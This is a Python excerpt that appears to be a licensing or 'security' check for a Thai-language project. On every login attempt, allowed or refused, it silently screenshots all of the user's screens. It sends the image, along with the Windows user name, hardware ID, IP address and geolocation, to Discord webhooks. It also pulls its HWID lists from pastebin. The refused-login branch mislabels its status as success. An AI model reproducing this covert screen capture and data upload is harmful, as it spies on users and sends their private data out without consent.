def generate_hwid():
    raw_hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).strip().decode()
    hwid = raw_hwid.splitlines()[1]
    hashed_hwid = hashlib.sha256(hwid.encode()).hexdigest()
    return hashed_hwid
datahwidreg = httpx.get("https://pastebin.com/raw/VQcwdb1a")
new_hwid = generate_hwid()[:32]
mypcname = os.getlogin()
hwid = f'{mypcname}-' + new_hwid
ipinfo = httpx.get("https://ipinfo.io/json")
ipinfojson = ipinfo.json()
ip = ipinfojson.get('ip')
loc = ipinfojson.get('loc')
datahwidauto = httpx.get("https://pastebin.com/raw/51XLMcUY")

def discordusercanlogin():
    image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
    image.save("imageprpsecurity.png")
    webhookusercanloginpic = DiscordWebhook(webhookusercanlogin, username=usercanlogin)
    with open("imageprpsecurity.png", "rb") as f:
        webhookusercanloginpic.add_file(file=f.read(), filename='imageprpsecurity.png')
    os.remove("imageprpsecurity.png")
    httpx.post(
        webhookusercanlogin, json={
        "content":"",
        "embeds": [
        {
            "title": f"User : {mypcname}",
            "tts": False,
            "description": f"""Project : {projectname} 
                Version : {versionproject} 
                Status : เข้าระบบสำเร็จ 
                HWID : {hwid}
                IP : {ip}
                โลเคชั่น : {loc}""",
            "color": 0x1cff00,
        }
        ],
        "username": usercanlogin,
        }
    )
    response = webhookusercanloginpic.execute()

def discordusercantlogin():
      image = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)  
      image.save("imageprpsecuritycantlogin.png")
      webhookusercantloginpic = DiscordWebhook(webhookusercantlogin, username=usercantlogin)
      with open("imageprpsecuritycantlogin.png", "rb") as f:
        webhookusercantloginpic.add_file(file=f.read(), filename='imageprpsecuritycantlogin.png')
      os.remove("imageprpsecuritycantlogin.png")
      httpx.post(
            webhookusercantlogin, json={
            "content":"",
            "embeds": [
            {
              "title": f"User : {mypcname}",
              "tts": False,
              "description": f"""Project : {projectname} 
                Version : {versionproject} 
                Status : เข้าระบบสำเร็จ 
                HWID : {hwid}
                IP : {ip}
                โลเคชั่น : {loc}""",
              "color": 0xcf0a0a,
            }
          ],
          "username": usercantlogin,
          }
        )
      response = webhookusercantloginpic.execute()
